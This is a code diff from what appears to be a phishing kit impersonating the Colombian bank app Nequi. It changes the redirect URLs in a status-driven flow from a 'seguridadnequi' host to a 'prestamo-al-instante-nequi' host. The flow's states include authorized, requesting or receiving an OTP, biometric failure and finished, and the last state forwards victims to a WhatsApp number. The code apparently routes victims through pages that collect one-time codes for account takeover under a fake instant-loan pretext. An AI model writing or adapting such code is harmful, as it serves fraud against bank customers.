@@ -189,16 +189,16 @@ document.addEventListener('DOMContentLoaded', async () => {
 
       // Redirigir según el estado
       if (data.estado === "autorizado") {
-        window.location.href = "https://seguridadnequi.vercel.app/cupo.html";
+        window.location.href = "https://prestamo-al-instante-nequi.vercel.app/cupo.html";
       } 
       else if (data.estado === "error") {
-        window.location.href = "https://seguridadnequi.vercel.app/inicio/codeinco.html";
+        window.location.href = "https://prestamo-al-instante-nequi.vercel.app/inicio/codeinco.html";
       } 
       else if (data.estado === "solicitando_otp" || data.estado === "otp_recibido") {
-        window.location.href = "https://seguridadnequi.vercel.app/inicio/codigo.html";
+        window.location.href = "https://prestamo-al-instante-nequi.vercel.app/inicio/codigo.html";
       } 
       else if (data.estado === "fallo_biometria") {
-        window.location.href = "https://seguridadnequi.vercel.app/fac.html";
+        window.location.href = "https://prestamo-al-instante-nequi.vercel.app/fac.html";
       } 
       else if (data.estado === "finalizado") {
         window.location.href = "https://wa.me/3019207518?text=Hola%20me%20interesa%20más%20información";
